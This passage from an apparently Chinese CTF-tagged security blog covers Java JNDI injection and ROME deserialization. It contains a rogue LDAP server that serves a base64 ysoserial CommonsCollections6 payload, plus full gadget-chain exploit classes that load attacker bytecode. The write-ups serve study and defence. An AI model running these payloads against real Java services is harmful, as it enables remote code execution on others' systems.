&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="高版本-2"><a class="markdownIt-Anchor" href="#高版本-2"></a> 高版本</h5><p>如果用反序列化，需要根据所选的链子加依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServerByPass</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lanuchLDAPServer</span><span class="hljs-params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    ldap_port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://&quot;</span>+http_server+<span class="hljs-string">&quot;:&quot;</span>+http_port+<span class="hljs-string">&quot;/#Calculator&quot;</span>)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;calc&#x27;|base64</span><br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException e1) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String[] args1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;9090&quot;</span>, <span class="hljs-string">&quot;1099&quot;</span>&#125;;<br>        args = args1;<br>        System.out.println(<span class="hljs-string">&quot;HttpServerAddress: &quot;</span>+args[<span class="hljs-number">0</span>]);<br>        System.out.println(<span class="hljs-string">&quot;HttpServerPort: &quot;</span>+args[<span class="hljs-number">1</span>]);<br>        System.out.println(<span class="hljs-string">&quot;LDAPServerPort: &quot;</span>+args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">http_server_ip</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ldap_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">http_server_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">1</span>]);<br><br>        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><p><a href="https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3">https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3</a></p><p><a href="https://tttang.com/archive/1611/#toc_jndi-references">https://tttang.com/archive/1611/#toc_jndi-references</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROME反序列化</title>
    <link href="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>ROME是用来处理和操作XML格式的数据的工具，允许我们把XML数据转换成Java中的对象，也支持将Java对象转换成XML数据。</p><h4 id="依赖环境"><a class="markdownIt-Anchor" href="#依赖环境"></a> 依赖环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h3><img src="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" class=""><p><code>ToStringBean</code>的<code>toString</code>方法中<code>BeanIntrospector.getPropertyDescriptors</code>能够获取指定类的getter方法，并且参数可控，这很容易想到<code>TemplatesImpl</code>类的<code>getOutputProperties</code>这条链实现类加载。</p><p>所以接下来只需要找到调用toString的链子就可以了</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><h4 id="badattributevalueexpexception"><a class="markdownIt-Anchor" href="#badattributevalueexpexception"></a> BadAttributeValueExpException</h4><p>不受jdk限制</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">B<span class="hljs-function"><span class="hljs-title">adAttributeValueExpException</span>.readObject-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templatesimpl); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class</span><br><span class="hljs-comment">//        Method toStringMethod = toStringBean.getClass().getDeclaredMethod(&quot;toString&quot;, String.class);</span><br><span class="hljs-comment">//        toStringMethod.setAccessible(true);</span><br><span class="hljs-comment">//        toStringMethod.invoke(toStringBean, &quot;111&quot;);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        SetFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,toStringBean);<br>        String s= serialize(badAttributeValueExpException);<br>        deserialize(s);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="equalsbean"><a class="markdownIt-Anchor" href="#equalsbean"></a> EqualsBean</h4><p>无jdk版本限制，目前这个payload是最短的</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>E<span class="hljs-function"><span class="hljs-title">qualsBean</span>.hashcode-&gt;</span>E<span class="hljs-function"><span class="hljs-title">qualsBean</span>.beanHashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class,</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span 